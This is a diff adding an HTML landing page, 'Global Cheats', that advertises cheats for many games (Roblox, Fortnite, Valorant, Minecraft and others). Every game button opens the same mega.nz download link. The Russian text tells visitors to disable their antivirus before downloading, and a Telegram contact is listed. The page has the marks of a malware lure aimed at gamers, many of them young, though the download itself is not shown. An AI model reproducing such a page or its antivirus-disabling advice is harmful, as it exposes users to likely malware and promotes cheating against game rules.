@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Global Cheats</title>
+    <style>
+        /* Smooth Scrolling */
+        html {
+            scroll-behavior: smooth;
+        }
+
+        /* Body and Background */
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            background: linear-gradient(135deg, #4a6cde, #f46b45);
+            font-family: Arial, sans-serif;
+            overflow-y: auto;
+            text-align: center;
+            color: white;
+            animation: backgroundShift 20s infinite;
+        }
+
+        /* Header */
+        h1 {
+            font-size: 3em;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.5);
+            animation: colorChange 10s infinite alternate;
+        }
+
+        /* Description */
+        p.description {
+            font-size: 1.2em;
+            max-width: 600px;
+            margin-top: 10px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+            opacity: 0.9;
+            animation: fadeIn 2s ease-in-out;
+        }
+
+        /* Section Styling */
+        .sections, .popular-games {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+            justify-content: center;
+            max-width: 1000px;
+            margin: 20px 0;
+            animation: fadeInUp 2s ease-in-out;
+        }
+
+        /* Individual Game Sections */
+        .section, .popular-game {
+            padding: 15px 25px;
+            font-size: 1.1em;
+            border-radius: 10px;
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(5px);
+            cursor: pointer;
+            transition: transform 0.3s, background-color 0.3s;
+            box-shadow: 2px 4px 8px rgba(0, 0, 0, 0.4);
+            animation: float 3s infinite alternate;
+        }
+        
+        .section:hover, .popular-game:hover {
+            background-color: #5b85ff;
+            transform: scale(1.05);
+        }
+
+        /* Contact Section */
+        .contact {
+            font-size: 1.3em;
+            font-weight: bold;
+            margin-top: 30px;
+            opacity: 0.85;
+        }
+        
+        .telegram-logo {
+            width: 50px;
+            height: 50px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: transform 0.3s ease;
+        }
+
+        .telegram-logo:hover {
+            transform: scale(1.2);
+        }
+
+        /* Keyframes for Animations */
+        @keyframes backgroundShift {
+            0% { background: linear-gradient(135deg, #4a6cde, #f46b45); }
+            50% { background: linear-gradient(135deg, #f46b45, #4a6cde); }
+            100% { background: linear-gradient(135deg, #4a6cde, #f46b45); }
+        }
+
+        @keyframes colorChange {
+            0% { color: #ffffff; }
+            50% { color: #ffcd29; }
+            100% { color: #ffffff; }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-10px); }
+        }
+    </style>
+</head>
+<body>
+    <h1>Global Cheats</h1>
+    <p class="description">Все представленные читы работают только через ПК/Ноутбук. Перед скачиванием обязательно отключите антивирус.</p>
+
+    <!-- Cheat Sections -->
+    <div class="sections">
+        <div class="section" onclick="openLink()">Roblox</div>
+        <div class="section" onclick="openLink()">PUBG</div>
+        <div class="section" onclick="openLink()">Fortnite</div>
+        <div class="section" onclick="openLink()">CS</div>
+        <div class="section" onclick="openLink()">Standoff</div>
+        <div class="section" onclick="openLink()">War Thunder</div>
+        <div class="section" onclick="openLink()">Minecraft</div>
+        <div class="section" onclick="openLink()">GTA 5 RP</div>
+        <div class="section" onclick="openLink()">Majestic</div>
+        <div class="section" onclick="openLink()">Valorant</div>
+        <div class="section" onclick="openLink()">Call of Duty</div>
+        <div class="section" onclick="openLink()">Rocket League</div>
+        <div class="section" onclick="openLink()">Genshin Impact</div>
+    </div>
+
+    <!-- Contact Section -->
+    <div class="contact">Если у вас есть вопросы, пишите сюда:</div>
+    <a href="https://t.me/cheat_Win_Private" target="_blank">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="telegram-logo">
+    </a>
+
+    <!-- Popular Games -->
+    <div class="popular-games">
+        <div class="popular-game" onclick="openLink()">Among Us</div>
+        <div class="popular-game" onclick="openLink()">Apex Legends</div>
+        <div class="popular-game" onclick="openLink()">League of Legends</div>
+        <div class="popular-game" onclick="openLink()">Dota 2</div>
+        <div class="popular-game" onclick="openLink()">Overwatch</div>
+        <div class="popular-game" onclick="openLink()">Hearthstone</div>
+        <div class="popular-game" onclick="openLink()">Team Fortress 2</div>
+        <div class="popular-game" onclick="openLink()">Destiny 2</div>
+        <div class="popular-game" onclick="openLink()">Rainbow Six Siege</div>
+    </div>
+
+    <script>
+        // Open the cheat download link
+        function openLink() {
+            window.open('https://mega.nz/file/k4x0xS4Z#Z-gcxP5rh9GcyjYDAb1k-VhT3T2TTfre8i0bs62Uims', '_blank');
+        }
+    </script>
+</body>
+</html>
